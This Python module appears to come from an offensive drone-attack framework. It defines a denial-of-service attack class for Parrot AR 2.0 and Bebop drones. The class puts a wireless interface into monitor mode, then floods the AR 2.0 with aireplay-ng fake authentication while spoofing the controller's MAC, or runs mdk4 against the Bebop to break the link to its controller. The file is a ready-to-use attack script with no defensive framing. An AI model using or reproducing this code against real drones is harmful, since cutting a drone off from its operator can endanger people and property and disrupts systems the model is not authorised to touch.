from shared import Manufacturer, Model, AttackType, InterfaceMode, CommandExecutor
from modules.exploit.base_attack_script import BaseAttackScript, AttackResult, DroneTargetInfo
from modules.exploit.attack_factory import register_attack

@register_attack(
    manufacturer=Manufacturer.PARROT,
    models=[m.value for m in Model],
    attack_types=[AttackType.DOS],
)
class DosAttackParrot(BaseAttackScript):
    def __init__(self, target_info: DroneTargetInfo):
        super().__init__(target_info); self.exec = CommandExecutor()

    def attack(self) -> AttackResult:
        pre = self._ensure_interface_mode(InterfaceMode.MONITOR)
        if not pre.status: return pre

        if self.target_info.model == Model.PARROT_AR2:
            return self._ar2_dos()
        elif self.target_info.model == Model.PARROT_BEBOP:
            return self._bebop_dos()
        return AttackResult(False, "", "", f"Unsupported model: {self.target_info.model}")

    def _ar2_dos(self) -> AttackResult:
        if self.target_info.interface is None:
            return AttackResult(False, "", "", "Interface is None")
        cmd = [
                "aireplay-ng",
                "-1", "0",
                "-x", "1024",
                "-a", self.target_info.drone_mac,
                "-h", self.target_info.controller_mac,
                self.target_info.interface.iface_name 
            ]  #    
        r = self.exec.execute(cmd,
                              timeout=30, sudo=self.target_info.use_sudo, exec_in_new_thread=False)
        return AttackResult(True, r.stdout, r.stderr, "DoS (AR 2.0) complete")

    def _bebop_dos(self) -> AttackResult:
        if self.target_info.interface is None:
            return AttackResult(False, "", "", "Interface is None")
        cmd = ["mdk4", self.target_info.interface.iface_name, "r", "-B", self.target_info.drone_mac]
        r = self.exec.execute(cmd,
                              timeout=30, sudo=self.target_info.use_sudo, exec_in_new_thread=False)
        return AttackResult(True, r.stdout, r.stderr, "DoS (Bebop) complete")
